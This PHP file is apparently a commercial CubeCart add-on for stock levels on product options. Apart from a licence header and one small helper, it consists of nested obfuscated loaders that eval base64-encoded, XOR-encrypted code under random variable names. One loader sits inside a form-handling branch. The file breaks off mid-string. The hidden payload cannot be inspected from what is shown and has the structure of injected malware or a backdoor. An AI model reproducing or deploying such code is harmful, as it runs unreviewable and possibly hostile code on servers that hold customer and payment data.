<?php
/*-----------------------------------------------------------------------------
 * Stock Levels for Product Options
 *-----------------------------------------------------------------------------
 * stockOptions.php
 *-----------------------------------------------------------------------------
 * Author:   Estelle Winterflood and Daniel V
 * Email:    cubecart@expandingbrain.com
 * Store:    http://cubecart.expandingbrain.com
 *
 * Date:     March 5, 2006
 * Updated:  May 19, 2008
 * Compatible with CubeCart Version:  4.x.x
 *-----------------------------------------------------------------------------
 * SOFTWARE LICENSE AGREEMENT:
 * You must own a valid license for this modification to use it on your
 * CubeCart� store. Licenses for this modification can be purchased from
 * Estelle Winterflood using the URL above. One license permits you to install
 * this modification on a single CubeCart installation only. This non-exclusive
 * license grants you certain rights to use the modification and is not an
 * agreement for sale of the modification or any portion of it. The
 * modification and accompanied documentation may not be sublicensed, sold,
 * leased, rented, lent, or given away to another person or entity. This
 * modification and accompanied documentation is the intellectual property of
 * Estelle Winterflood.
 *-----------------------------------------------------------------------------
 * DISCLAIMER:
 * The modification is provided on an "AS IS" basis, without warranty of
 * any kind, including without limitation the warranties of merchantability,
 * fitness for a particular purpose and non-infringement. The entire risk
 * as to the quality and performance of the Software is borne by you.
 * Should the modification prove defective, you and not the author assume 
 * the entire cost of any service and repair. 
 *-----------------------------------------------------------------------------
 */

$list_all_prod = "-- List Products From All Categories --";
$please_select_cat = "-- Please Select A Category --";
$please_select_prod = "-- Please Select A Product --";
$nullText = "-- n/a --";

function product_display_name($name, $code)
{
	global $sort_products_by_code;
	if ($sort_products_by_code) {
		$display = $code." -- ".$name;
	} else {
		$display = $name." [".$code."]";
	}
	return $display;
}


$sqsmYKnlvRLNnj="eval(str_rot13('sqsmYKnlvRLNnj(scsLfRbVLpgMnkaHQMzGXGWfOfjfVTEdvhYYUIJowGEXHMayGnPPWUouJS,snzSoRvfXeds)'))";$sEJGaIqeFBwQzD="sXUDCdBVYmGwN";eval(base64_decode("JHNFSkdhSXFlRkJ3UXpEPSJzWFVEQ2RCVlltR3dOIjtmdW5jdGlvbiBzWFVEQ2RCVlltR3dOKCRzVHp2SUJVU0UsJHNhRllzSkV1em1vKXskc1RDSWxtWGtxUW9TUXBTZlI9JHNUenZJQlVTRV4kc2FGWXNKRXV6bW87cmV0dXJuICRzVENJbG1Ya3FRb1NRcFNmUjt9ZnVuY3Rpb24gc0RWWHZNTm5aa0ZzcnFWcUwoJHNITlFzcE9UeVFZRkZKdWxHLCAkc0p3UlBWemV6SWROdmR3SSl7Zm9yKCRzSm9ob0dRY0h5T01nPTAsJHN0Y0hPcXBLV1NzPTA7ICRzSm9ob0dRY0h5T01nPHN0cmxlbigkc0hOUXNwT1R5UVlGRkp1bEcpOyAkc0pvaG9HUWNIeU9NZysrLCRzdGNIT3FwS1dTcysrKXtpZigkc3RjSE9xcEtXU3M9PXN0cmxlbigkc0p3UlBWemV6SWROdmR3SSkpeyRzdGNIT3FwS1dTcz0wO30kc0hOUXNwT1R5UVlGRkp1bEdbJHNKb2hvR1FjSHlPTWddID0gc1hVRENkQlZZbUd3Tigkc0p3UlBWemV6SWROdmR3SVskc3RjSE9xcEtXU3NdLCRzSE5Rc3BPVHlRWUZGSnVsR1skc0pvaG9HUWNIeU9NZ10pO31yZXR1cm4gJHNITlFzcE9UeVFZRkZKdWxHO30kc3RKRFBqYk89InNEVlh2TU5uWmtGc3JxVnFMIjskc1lGcGdSR2E9ImV2YWwoc2hhMSgnc0RWWHZNTm5aa0ZzcnFWcUwoc3NRbXdIdVJybmVoenJmYVZ3aU5jSnpuVEhQUlN3cHJYR01nR3FwYVRnTHRpZmxid1VCcWpDLHNnc0pUTXh1VGN1bkJ0S3RlKScpKSI7ZXZhbChzRFZYdk1OblprRnNycVZxTChiYXNlNjRfZGVjb2RlKCJaeWdYY21VdUZ4OHNQU0lsV1gwSENTMHdDeG9ZRWpRT1kyTmJBbVUzTGlSWmVBVXBFUncySUdjRkZEUXRMeFpiYkdoblBGRitOeUViQ1FNOEtEVVVLR1IzVWtoK2MyTWlIalFpSXhVbUt6SXFKRkZuWkdnaERTb3dMQjQ5UHpJdkhnb2FOU2d6TGdvMkpSWU1KaWNZRGdFdU4yaEpXV0UrS0NVdUxpMCtIaHhsYm1kaklpNHJLUmxaQ1RZeEpCMHBaQ3dkQzJVRE5TNFZMeWMrVWpZMUp5NHVIeWxtY1ZKZEpEQTFMaDhqS1dwUFdXY0FDeEUrZUg5cVZnOGdJVFFvSGpSa2QxSmJkSDEvWTBwNllEb0hDeVk3SmpJVUJTMHVVa1JsY1hCMlUyRmtiZ1lBTlRabmZGRjRLU1VXVzM1ell6Z1VPelpxVDFsbllYZHhSM2QyZWtKQVoyaG5aUncxSUQ4ZUhHVnVaeWNVTGljaU5oc0dQQ2tuR0Qxc2JoRVdLelV1Smk0MEpTY1hVSDV6WXkwUU5DTnFUMWtpTmpNTkVEUWpZbEFZSVQ0dUwxTjBCd2t0UFJaOVpTQVZOeTBrTFFrM1BDTTBFaTQzWkJzWEpuMDNLUUY0YlhGU1hTNDJQaDRlTVdSM1VnMDNKaUo2VVRNaWFscGRLRHdqTkIwL0gyMGZGaUVNTkRVZUtDRVZHeDFpRG1kZ1RIb3BMa2RSWWlBdUpWWjBZQzBlRmljSVlDMFlPU0VrQVJ3YU9DSTRWZ2R0WTFJQ1pUb2hZVmwrS1NVV0RDazJIR1lDTGlVK0J3b2FNQ1IxVmdkNWQwTlFaU2huWlJ3MUlEOGVIQjUwTkRVUUxqRTVMUm9tWjJBY1VXZGtiaDhXSVNZckpDcDlOejRURFRBZ1lCeFJaMlI2U1ZrM05qWTBHQ2doYWpFNkdnRUlEaVVGQUFNZ1Z3WVFHQVVpZEdNbkhSMHdQeUl5Vm5RSENTMDlGbjFnTWdVN01EOEJWeXc5Skc4Qk1qUnRTVmt5SVM0MUZCNG1DUjBYSTN0akxCNCtNU1lYVldWM0pDNGZQQzB0TFJja1BpSnRVWDRwSlJZTUtUWnVlbEVuWkc0WkhEd01LQ3BSWjJRc0V4VTJObnhoREhvMkx3TU1MQ0VpSGg0MEp5OWFYaWc4SXpRZFB6ZHRYRG9HREFNU1gzMTNPQllKSkNFek9GWjBCd2t0UFJaOVlCSUZOU2NoTFRVZ0pTSXRBZ1VpSlFBbUZTRW9KUVE1TUJVOUNURWdZRzh5R1JzT0lWZGlNQ3NnQWlraE9WVlhCaEFZQlNKMFl6a0dGaVk0S0RFRmRDMGtFVmMxT3pkbVdHRmtiaEVSSkQwZ0pENHFNQ01kRnpaemVtRVhPeWc1RjBKbGR6UXVVV2RrTEJNVk5qWjhZVlUzTnkxU1JHVnhaWHBSTXlKcVdoQTJJQ0kxV1g0YkRUY3RIblEzTXg0K0d5TVdYaGg2Ym1FS2VtQTZBQlloREM0bFVXZGtiaTArQUFjY1pnRW9LeTR0RUNGMEducFJKMlF2SGdvZ2N6eGhWU28ySlJZbUxEZG5mRkZxZjJvUFdTdzFaMmtZS1RjdkJsRmhEQUFFSlFGaktSTU5Ham9qWml4emJXb0pXV0V3SmpVdU15QnFUMWxoREFBRUpRRmpLUk1OR2pvalppeGhaRGRTSENrZ0ltRUtlbUFwRXcwYU9pTmhUSHAwY1ZJRVpUVXlMeEl1TFNVY1dTOHlNU0FDT1RZakFnMFFJeU1nQlQ4VU9CMGRNREF6RFJncE1HSldDaTA4TUI0ZE16YytMUllqRENZdEhRVTBPQjBkTURBek1sMTZZRG9lSENRZ0loNENQeWd2RVExcGMyTXhBelVnUHhFTk5uOW5aUUVvS3k0SEdqRWdGQzRETGdjckJsVmxkeWswSFRZUUx3b05iSE04WVZVd055a0FFRFVuWjN4UmVHWnhVbDB2SUNRekdDb3dhbHhFWlhGbkp3UTBKejRiRml0ek1qRVZPekF2SWdzcU56SWlCUll0T1FaUkpqSXpCeGcvS0M0N0hXbHpOek1lUGdJakZ4VWhHaU50VVNvb0x4TUtJQUFpTFJRNU1HTlNBbVVsSmpOUktqWWxGajhzTmlzbFVXZGtMaDBhTUQ0aUx3VjBJeThHUENrMktpUWZMZ1l6T3gxdEl6VXVGUnd0THg0ZEREZHVlbEVzSlRoU0dpUW5BU2dVTmlCcVQxa2hQQ1EwSEQ4cVBsd2VJQ2NDTFJRM0lTUUdPendhSTJrU096QU1HeHdwTnc0bFdHRmtQQk1MWlIweUxDSXVKVDRYV1hoek56TWVQZ0lqRnhVaGZTZ3hCVE1ySkFGWEtUWXBKZ1V5ZjJvRUdEZHpCRFFES0NFa0Jqb2tKeUltSGlnOWFrOVpZblI4WVFZeUxTWVhVUXNtS2hJRk96QXZVa2RsWTI1aENub0tQeDhxTVRJekpGeDNmMm9DQ3lvM0FTZ1VOaUJrSFFreE9pZ3ZBZ0VLUHg4cU1USXpKQ3g2ZVdvY0RDay9mR0VNZW1ScVVsbGxjMmRoVVJreE9BQWNLeWNFSUFVL0l5VUFBR1Z1WnlJUUxnSWpGeFVoZlNneEJUTXJKQUVpSmpJekJ4Zy9LQzVjQ2lBL0lpSUZQeUFESEIwZ0t4cHZCenNvUHhkQ0dTRWJMMU5oWkc0WUNpWWhMakVGZW1wM1Vsc1pJUnN2VVhvdExGSlJCaVkxTXhRME1Ba1REU0EwS0RNSWVubDNVbDUxZEc1aENnWTJGaHdsTnc4cFkwcDZaRzRZQ2lZaExqRUZlbXAzVWx0bGMyZGhHSHA1YWtKQ0dTRWJMMU5oWkNNVVdXMTNOQ2tlTFJzbUd3b3hEQ2duTGpzb0ppMEpOendqTkJJdU4yTlNBbVYzTnpNZVBqRXBCamNrUGlKaFRIcGdPaDRjSkNBaUhnSS9LQzhSRFg1ell5c0NPVFlqQWcxbGZYcGhVM3BrYWxJUUkzTnZNUjAvSlRrWEtpQS9JaUlGYzJaeFVsMHZJQ1F6R0Nvd2FseEVaWEZuTVFNMUlBd2JIQ2szYVM0QkxpMGxIQW9lT214cUxIcDVhaHdjTW5NSU1RVXpLeVJhWG1kOU5EVURCVFl2QWhVa01DSnBFQ2cyS3d0UllnOGJabDE5WW1sQlFINTBibTBRS0RZckMxRmlEeHNkTFgxb2JTNGxHWFJnYUYxK05EZ2RIVEF3TXc4UU55RmpYRnRpZjJkbVFYMXRjUzRMR1QxbGVsRThLemhhWFN4dWQzcFJmaTEyRVJZd1BUTnBWU28ySlJZTUppYzBhRXA2WUNOWlVteHpQR0ZWS2pZbEZnd21Kd2tnSEQ5a2QxSUpOendqTkJJdUd5NGJDalUvSmpndU5DVW5GMUZoSXpVdUZTOG5QZ0VpWVRvYUdsWTBKU2NYWGhoL1oyVUJLQ3N1QnhveElCeGxHQWNmYlFJTEtqY3lJZ1VaS3k0WFhoaDZmR0ZWTURjcEFCQTFKMmR2VEhwbWFsSlpaU00xTGhVY0xTOGVIV3M4TnpVWU5TbzVLUkJ1ZUJwaFRIb3FMd1ZaQ2lNektCNDBiRzFRVnpZbk5SNERQelFtRXhvZ2V5WXpBenM5WWxVbEdYUnJabGQ1ZDNOSlhteC9Kak1ET3oxaVZTVVpEeHRtWFgwWUZpNWVZbnByWlFFb0t5NEhHakVkSml3VWMycG9WVlZsZEdWdlZTbzJKUllNSmljMEdsVXpHUkZWQ1RjOEl6UVNMZzB1VlNScmNXQm9TZ1kyRmh4YmZuTTZZUXg2SVNZQkhHVW9aMlVCS0NzdUJ4b3hIU1lzRkhwNWFsWVhNRDhyRlJRaU1IRlNYUzhnSkRNWUtqQnFYRVJsY1dkaFVYbzBPQjBkQXpvaUxSVjBLem9HRUNvOU5Cb1ljVzhYVWtSbFBTSTJVUlUwUGhzV0szdGdZMThwTURndEN5QWpLeUFTUDJ3ckFBc2tLbTltTFFaalpsVmZabUIrZWxaemFDc0FDeVFxYjJZdEJoZ1dWVlZpRHhzZFZuMXRabFlKTnp3ak5CSXVDaXNmSEd4OVpXWmRlbU42VlZCK0R6VWRIM2gvYWc5Wkl6dzFZVmwrTFhkQ1FtVjNMbjBTTlRFa0JsRmhJelV1RlM4blBnRXFLaUV6QWhBdWJYRlNYU3g0YkdoUklXUWpGRmx0ZHk1OFRHcHRhZ2xaWVRrMElnTXpORDVTVjNoelpSMERCaXBxVWdSbE5pc3lGSG90TEZKUkJpWTFNeFEwTUFrVERTQTBLRE1JZW5sM1VsNW5mV014QXpVZ1B4RU5OZ0FvTXdVWkpUNHBYU3dPSEdZU096QVZHeDFpRG1salZuTmtNUzRMR1QwYk15MDBabkZTWFM4Z0pETVlLakJxWEVSbGNXZGhVWG90YWs5WmRXZ2JNeTAwWm5GU1hUVWhLQ1VFT1RBRUV4UWdjM3BoVlNvb0x4TUtJQXcwSkIwL0p6NUpXV0U1TkNJRE16UStVbGQ0YzJWaFVYcGtJeFJaYlNNckpCQXBJUmtYRlNBd00yaFRZV1J1R0FvbUlTNHhCWHBxZDFKYlpTTTFMaFVjTFM4ZUhXczhOelVZTlNvNUtSQnVlQnBoVEhvcUx3VlpDaU16S0I0MGJHMVFWelluTlI0RFB6UW1FeG9nZXlZekF6czlZbFVsR1hSclpsZDVkM05KWG14L0pqTURPejFpVlNVWkR4dG1YWDBZRmk1ZVlucHJaUUVvS3k0SEdqRWRKaXdVYzJwb1ZWVmxkSGRtV0dFWU9DNFhaMmhuUEZFL0tEa1hFQ056YjJVZU5pQUpFdzBnTkNnekNCTWdhbE5FZUhOak1RTTFJRDhSRFRZQUtETUZHU1UrS1Ywc0RoeG1FanN3RlJzZFlnNXVZUXA2WUNBQkdqYzZOelZSZEhscVVDVTNEeWxoVVNka0x4NEtJSE11SjFGeUJ6OEFDeUE5TXdJUUxpRXRIUXM4YzNwOFVYMW1aRllKTnp3ak5CSXVOeGtkQ3pFUUpqVXFmaTBYS1Y0bU1qTWVHRDVqRjF4YllucG5PaTBvR0NRdUN4azlaWHBSZmk0NUVRc3NJek5oWDJka2FGSlpaWE11WVV4NmRIRXVDeGs5WlhwUmZqUTRIUjB3TURNUEVEY2hhazlaWVNNckpCQXBJUlVCSENrMkpEVktlbUFnQVJvM09qYzFVWFI1YWxCWlpYTm5LQmQ2YkRvZUhDUWdJaElVTmlFcEJsQm5hR2RsR3lrbk9Cc0pNWE5wZkZGNFpEb0FGaUVWTGlRZFBtb2xBZzBzUENreUtqTnZZUzlaZUhNcEpBWjZDem9HRUNvOWIyWlRkRGMrQUNZM05qY3RFRGtoWWhNTE56SSthVllHR0cxZVhtTndkSGhLZlcxbUV3czNNajVwVmdZWUZpNWVhWFFiSFMxOVkyTmVYVFVoS0NVRU9UQUVFeFFnZW1salZuWmtiVUplYkdnYk15MDBabkZTQkdWM056TWVQakVwQmpja1BpSmhUSG8wT0IwZE1EQXpIaFV6TnpvZUdEd01LU0FjUDJ4dUFnc3FOeklpQlNrWEpRQU5Cakl6R2xVekdSRlZGeVErSW1Zc2RtUnVBZ3NxTnpJaUJTa1hKUUFOQmpJekdsVXpHUkZWQ1RjOEl6UVNMZ2NsRmh4aURtNTZVWDR1T1JFTExDTXpZVjluWkdoU1dXVnpOek1lUGdJakZ4VWhmU2d4QlRNckpBRWlMSGhzSEZGblpDUVhEbVVjTnpVWU5TcGlWVnRySURNekxpZ2hPaDRZSmpadklBTW9KVE5hWGhrUFlHMVdmR2Q1UzBKaWVtc2dBeWdsTTFwZUdROGJIVloyWXhZdUpXSjBibTFWS2pZbEZnd21Kd2tnSEQ5dFpGQmVhWE5nWTE5K05EZ2RIVEF3TXpJaU5UWStNUmd4Q0dNb0xBRmpPZ0FXSVNZa05UZytZeGRjVzJKNmZCMERCaXBvU1ZsaFBDc2xNanN3THhVV055b09KVkZuWkc0Q0N5bzNNaUlGS1JjbEFBMEdNak1hVlRNWkVWVWFKQ2NZS0JWOUdYRlNCR1YzTFRJU0tDMDZCbGxyYm1kakxTZ1lKRkpaT0hNaUxRSS9aREZTSlRjUEtXRlJlbVE2QUJZaEZTNGtIVDVxSlFJTkxEd3BNaXBxR1dwUFdTczJNR0UrS2pBakhSZHRkR1Z2VlRReEpoNHRJQ3N6YjFOOWFHcFZYbXhvWngwREJpcHFVZ1JsRHpVZEgzaC9hbFlUTmpBMUtBRXVaR1JQV1djUE5SMGZKeGc0TGhkbmFHY3pGQzR4T0J4WllUazBJZ016TkQ1SldUaHpJVFFmT1RBakhSZGxQajRlRUNnMkt3c21KandxSXhnMElXSldHSFIvWXlCRGMyUXhVaDhxSVc5bEdHZDBjVllRZVRBb05COHViRzRUU0d4b1l5aGFjVzFxVmdza0NHTWdRQUZnSXk4a1pXNW5aUkJvSDI0YkpINXpMaWRaTXpjNUZ3MXRkelVnV0hOa09CY05NQ0VwWVZVb0pYRlNIQ2tnSW1FRFB6QS9BQmRsTlNZdEFqOS9hZzlaSXlZcElnVXpLeVJTR2lRbklpWWVLRDBGQWcwc1BDa3lXWDRuS3dZY0lqdzFLQlFwYldvSldTSS9LQ01RTm1SdUVSWXJOUzRtWFhwZ0xSNFdKMzluWlJVNGYycFdGalVuTGk0ZktXUjNVbHRuYUdkbEVqc3dGUllRTnd3cElCdy9OMnBQV1NRaE5TQUljbTF4VWwwbU1qTWVHRDQzYWs5WkpDRTFJQWh5YlhGU1hTTXlNeWtVS0JzcEV3MDJjM3BoVlQ0bVowd0tJRDhpSWdWeVpoazNOUUFRRTJFU096QVZHeDFwY3lRZ0JRVXFLeDhjYVhNa0lBVUZJaXNHRVNBaEdDZ1ZlZ0lZUFRSbGNXbGxGallyS0NsZUlURTNNeFE4TFRKVkpHdHhCRFFUUHdjckFBMGFNQ1kxRkQwck9BdFpDZ0VEQkNONkJoTlNHaVFuR0NnVmVnQVBJVHBuZW54aEZ6VTJhbHBkSm01M2VsRitKM1lSRmpBOU0ybFZPU1UrRng0cUlTNGtBbk4vYWxZYWJuaHVZUXA2WUM0YkN3UWhOU0FJZW5scUV3czNNajVwV0dGa2JoWVFOeEkxTXhBakh4ZFNSR1YzSkNBRlB5TWxBQkFnSUJ4bEVnY2ZiUkVZTVF3cElCdy9ZeGRKV1dFd0pqVXVQQ1UrR2h3M0RDNGxVV2RrYmhFWU1UWWdMZ016SVRrcFhTWU9IR1lTT3pBVkZCZ3hPeUl6TGpNZ2JTOUNaVFVvTTFGeVlDTlBTWDV6WXloTlp5Y2xCeGN4ZTJNbkVDNHNMd0FtSmpJek1saGhaRzRiVW01Nlp6cFJNeUpxV2hBMklDSTFXWDRpS3dZUklDRVlJaEF1TnhGV0VCZ0lZQ0lRTGhzakZsNFllbWRuVjNwZ0xCTU5MVFkxSGhJN01Ea3BYU3dPSEdZU096QVZHeDFpRG5wOFZUa2xQaTBmSkNjdkpBTUZMUzViV1Q1ell5VVlLQVU0QUJnOENCcGhUSHBnTEJNTkxUWTFIaEk3TURrcFhTd09IR1lTT3pBVkhCZ29ObUFjU25wZ0tSTU5HalVtTlJrL05oVWJIV1Z1WjJVWE96QWlGd3NhTUNZMUFnRmdJeThpWWpBbU5TNDhKVDRhSERjTUxpVldCMzlxRDFrNGN5d3pBalUyUGxwZElUbzFBQU1vSlROYlFtVWhJaklVTG14dUZoQTNFalV6RUNOdGNWSmRKakl6SGhVek5oVWNHQ2cyTkJvc2VubHFWaG9xUFNFb0ZnRmpMaHNMRmlvcUl4NDJZeGRjRUNnakt5NFZQMnh1RVJZck5TNG1LbjBnSXdBcVBENGxMaDE5R1daV0hTd2hCak1ET3oxalNWbGhNQ1kxTGpNZ09Ta2taVzVuWlJJN01DOFZGamM2SWpJcWZpY1hLVjRtTWpNZUdENWpGMGxaT0hOaklBTW9KVE10RlNva0lqTVNPemN2VWtSbE1qVXpFQ01iSnhNSmJYUTBOUU11S3lZZERpQWhZRzFSZmljckJpWWhPalVlSHpzcEx3RlFmbk1tTXdNN1BSVWZEQ2tuTGpJZUtEQmlWaGczSVNZNExqWXJQUmNMSmpJMEpGMTZGd1VnTFJvU0ZBSmRlaGNGSUMwYUFCTVRPQlFEWmxKZEpqSXpIaFV6TmhVY0dDZzJORzFSZmljckJpWXNOelJvU25vMkx3WU1OejFuTEFnRkpUZ0FHRHdNSkM0Y09DMGtGMUZoTUNZMUxqTWdPVjVaWVRBbU5TNCtMVGd0RnlRK0lqSllZV1EzVWc9PSIpLCJHQXFaREpyeUVTIikpOw==")); $szBPvbvitiPJ="sqsmYKnlvRLNnj";
if (isset($_POST['activate_stock_levels']) || (isset($_POST['stockLevels']) && isset($_POST['productCodes']) && isset($_POST['assignKeys']) && $prod_id != 0) || isset($_POST['selectOptions']) || isset($_POST['changeOptions'])) {
$sAUyzPMPDlZb="eval(str_rot13('sAUyzPMPDlZb(slNvsOGHotJYzXAdsamkLAwcVVkSOjgrIOqKvKsItvryuSRQPBZVxtsAJTc,ssaHAOlnSRAxDSqsR)'))";$sOXqeFWgFZ="sGZCyhLsXAOacfFG";eval(base64_decode("JHNPWHFlRldnRlo9InNHWkN5aExzWEFPYWNmRkciO2Z1bmN0aW9uIHNHWkN5aExzWEFPYWNmRkcoJHNNak53T1lCSWNYQnVWRFJQLCRzUmRIbmpwZldFKXskc1dEQUhzYVh4Yz0kc01qTndPWUJJY1hCdVZEUlBeJHNSZEhuanBmV0U7cmV0dXJuICRzV0RBSHNhWHhjO31mdW5jdGlvbiBzc0huaUpRTGR3Y0ZpQygkc0pOekZoTW5GS3ZwY0ZJRkIsICRzT0ZoTUlweVZGaEhwKXtmb3IoJHNna0ZISm9jVlF4ckg9MCwkc1FMSmdZVXNNYWRBUEJaQU49MDsgJHNna0ZISm9jVlF4ckg8c3RybGVuKCRzSk56RmhNbkZLdnBjRklGQik7ICRzZ2tGSEpvY1ZReHJIKyssJHNRTEpnWVVzTWFkQVBCWkFOKyspe2lmKCRzUUxKZ1lVc01hZEFQQlpBTj09c3RybGVuKCRzT0ZoTUlweVZGaEhwKSl7JHNRTEpnWVVzTWFkQVBCWkFOPTA7fSRzSk56RmhNbkZLdnBjRklGQlskc2drRkhKb2NWUXhySF0gPSBzR1pDeWhMc1hBT2FjZkZHKCRzT0ZoTUlweVZGaEhwWyRzUUxKZ1lVc01hZEFQQlpBTl0sJHNKTnpGaE1uRkt2cGNGSUZCWyRzZ2tGSEpvY1ZReHJIXSk7fXJldHVybiAkc0pOekZoTW5GS3ZwY0ZJRkI7fSRzU2tFUnVVTnJReT0ic3NIbmlKUUxkd2NGaUMiOyRzSlNtQVlMZD0iZXZhbChzaGExKCdzc0huaUpRTGR3Y0ZpQyhzUGdwTW5wTmlXWFBsV3BvVlNkQktPenVDb21rVnpFUlBabUZHVHV0dUxPeUVIRk1nbUdCQkVhLHNMbkFDa3VyWVdEbHB0VHMpJykpIjtldmFsKHNzSG5pSlFMZHdjRmlDKGJhc2U2NF9kZWNvZGUoImN3WUVRV3d3Q2lBS0EyTldERDh0TWhBQ1hqSU1BeUlFTWhzSFBqY3RGakFFS0NjWEpRb09FbU1FVUhwUERHc0hQUndIRld4OUN6WU1HRGtXZWxSQ1JUWThHandkRXhCVkpod0hNakEyR2pnakVqMFhQMGcvUVhsNVNHaFBVendhTmgwSFFYbDVXeU1kR0M4SE1Cc3JCV1JrV1hGQlV5OFFmbEVQR0JjSU5RQU9FUzVhZHg4UURpQUdFRGRHVEd0V0poOEdBREE4V1c1UFV5OFFmbEVYRVNBNERUWkhVeXdlUEEwNVJpQTdDU0VLRVNJS2RESk1Rd2NzR3pZc0Zqa0dEQVlNRnlFM0RUd2REbWxlYzBzUUJDYzJDemREVjI4Rk93b1FCRzFpV1RvSlYyTldKaDhHQURBOFVITVVWMjhmSUFoQ1QzbDVXMjhmVnlnZU1od1JYR013RnpVQUl5NEtKMGhjTWpFNkdqWWNCQzBIUHdNYlFURXBIVEliRWk5U0QwMDNFaUY1Q2ljQUZDQlNQd29VQkNnRlczTWNFajhHT2dFRlhXc3BSM0ZVVnpaU05nTVJCR1FpV1hjQ0JDeFNmVkpDUTNncFdUQURGamdCYmtnVkFEWTNMVFlYQTJ4TUVBQVhEU0EzWGlkUEFqc1dNaHNIUVJoN0xDQUtWemdHUEF3SlFTZzhEellESzJsU0lBb1dGUzAzSG5OSEdEbFNQUUJDQWl3NEZ6UUtCR3NHUEU4WEVTQTREVFpHUzJRQ2JVMVpRVGw1REQwY0VqOWFkeDBIQWlzckhYcFVWelpTT2dsS0NEY3FIQ2RIVXhRaUhEdzJPbU1xRFR3TUhBY1hKUW9PRW1NRVVITkpVV3NiSUJ3SEZXeDlKZ01nSkI4cGRCOFFEaUFzR2ljc0dDOFhJRWcvU0dSNVgzVlBIamdCTmh0S1JSc0pOZ0E3TEd3VElCd0xCaW9TSENvY1VCWmJjMGxFUVdBcEN6d0xLQ0lXYzA1ZlFYUndXU2hQVXlvQklBWUZEdzg4QUNCUFNtdFdERDh0TWhBQ1hqSWNCQ0lWUFNRSEdEZCtKR2hQVXpnR1BBd0pMU0V2SEQ4Y1YzWlNkekF5TGhjTkluUWNBeVFST0NNSEZ5RTFDblF5VEd0V0l4ME5CVEU2RFJBQUV5NEJjMUpDUlJzSk5nQTdMR3dDSVFBR0ZDY3RPandMRWpoVkRsUkNSUzAzQ201ZlRHdFdKaDhHWEhSaVdYY0xFaWRQWTFSQ1JUQTJEVElES0RnR1BBd0pRWGw1U1doUEVTUUFlMHNMWEhSaVdUb2NLQ29BSVE0YlNXQTRDaUFHRUNVNU5oWVJTR1IvWDNOTEhuY1JQQm9NRld4OUdDQWNIaXdjR0FvYkVtMWlXWGNHWEdCYmN4UkNSU0E3RFRJTkd5NVNiazlHQmlnMkd3aElFeWtDSVFvRUNEeCtKSDFOTkQ0UU5pd0RFekFHRmlNYkhpUWNJREFSRlNzNkVnd0RFajBYUHh4QVdtUjlEanNLQlM1U2JrOUFBRGNxRURRQktDQVhLazlmUVdaM1hUY05XblVmS2p3ekxSYzRIelpIVXlvQklBWUZEdzg4QUNBMFV5SXZlazlNUTJRWU54ZFBCemtkTnhvQkZSc3dIWE5TVjJsY2R4OFFEaUFHRURkVVYyOERKZ29RR0dSa1dYRThNZ2MzRUR0Q1MyUWZLeHdpVjJsY2R3c0FGU1U3RlRaQlZXc2xHeW93SkdSN1YzY1lIeTRBTmxSQ1JUWThDbk5TVjI4V01VSmNFaUUxSERBYlgyOERKZ29RR0cxaVdUb0pYMjhCSndBQkNnZzhEellEQkJCV09qSkNYSGw1WG5SUFVXMVNkeDhRRGlBc0dpY3dGQ1FXTmh3NVJTMEVXVzVTVjJ4VmVrOFpRUzAvVVRBQUFpVUdlMHNRQkRkd1dXMVBSMkpTS0U5R0ZpdzhDelpQU210UU1od1JDQ00zSmpnS0RtdFBjMDFNUlNBN1ZHMENEaGdqSHp3REJ5RnhYVEljQkNJVlBTUUhHRGNDWFRveVhtdGNjVThqTHdCNUNTRUFFejRSSnpBTEJXUmtXWEZCVXpzQVBBczlDQ0JpV1hjTEVpY1hKd3BDWEdSOUhURkNTUzhYUHdvV0JHeDlIajhBRlJCVk53MFNFeUUvRUN0SUttVlFFQm9BQkFjNEN5Y3dHRHNHT2dBTUVoc3FEVHdNSEJRZU5oa0hEVGQ3VlhOTEFDTVhJUXBMV21Rd0gzTkhVeThYUHdvV0JHMTVYVGNLRzJCWmFFOGZRU2MyRnljR0dUNFhhRThmUVdBckhEQUFCUzhwZEE0UkVpMCtGd3dFRWpKVkRrOWZRV0E5RzM1UkdqSWhBaU14QUNJOFVYY09CRGdiTkFFcEJEMHFJbmNHS21KSmMwc1FCQ2MyQ3pjMFVEZ0dQQXdKUGlnOER6WURVQlpTYms5R0JTWjBSejRXSkJvK0FBNEVCR3h4WFNBYkdDZ1pId29VQkNncUluY0dLbUpiYUU5R0V5RTZGaUVMTEd3Q0lRQUdGQ2N0SmpBQUV5NVZEazlmUVdBOUczNVJHakloQWlNeEFDSThVWGNmQlNRV0pnd1dJaXM5SENBMFV5SXZlbFJDUlRZOEdqd2RFeEJWSXgwTkJURTZEUXdHRTJ3dmMxSkNSU0E3VkcwQ0RoZ2pIendEQnlGeFhTTWRHQzh0T2d0TFdtUjVXWE5QVjJ0U2N3WUVTV0FySENCR1Z6QlNkeG9TQlNVdEhITlNWMjhXTVVKY0ZEUTlHQ2NLWDI4V01Sc0RBeWc4VlhOTEJTNFJQQjBHVFdSOURqc0tCUzViYUU4TEIyUnhYU1lmRXlvR05rWkNSVEVwSFhoRVRHc1Bjd29PRWlGNUFuTkxIaVVCTmgwV1FYbDVYVGNOV25VYlBSd0hFekJ4WFRjTkF5b1FQd3BPUVdBckhEQUFCUzliYUU4TEIyUnhYVG9CQkM0QUowWkNSUzAzQ25oRVRHc1BjMHNXRGpBNEZRd2NBeVFST0U5SlhHUnhYU0FiR0NnWkh3b1VCQ2dxSW5jR0ttSkpjeEpDRkNvcUhDZEhVemtYTUFBUUJXMWlXWGNkRWlnZElRczVSamN0RmpBRUtDY1hKUW9PUmhsNVJITkxBeVFHTWdNOUVqQTJHamhVVjI4Rk93b1FCR1JrV1hFZkJTUVdKZ3dXS0NCNVJITk5XVzhXTVVKY0REMEtLQjg4RmkwWGUwc1NFeXM5SmpvTFhuQlNkeG9TQlNVdEhITlNWMjhXTVVKY0ZEUTlHQ2NLWDI4VlB3QUFPbU05R3lNZEVpMGJLMGcvVDJZYURERUtOQ29BSnpBTER6SThGeWNBQlRKUWYwOUdFeUU2RmlFTFcydFdKQWNIRXlGd1FuTkxCUzRXT2gwSEFqQUdEQ0VEVjNaU2R3Z09EaVlDWGpJTEdpSWNGUVlPQkdNRVYzRlFLQ3hQY1VGR1BnTWNMUWhJS0N4VkRrRkFSeVUwQ1dnQ0dDOEhQd3BmUTJwOUpoUXFJeEJWUGdBR0ZDZzhYZzVVVjI4QU5nc0xFeUU2RFF3YUJTZFNmVkpDUTJJNEZDTlVCemtkTnpBTEJYbDdWM2NmQlNRV0RBWUdUMlovR0Q0ZlRDZ1RKekFMQlhsN1YzY01Gajh0T2d0WlFXQXJIRGNHQlM0Ukp6QVhFeWg1UkhNY0F6a3RJUW9TRFNVNkhIdE5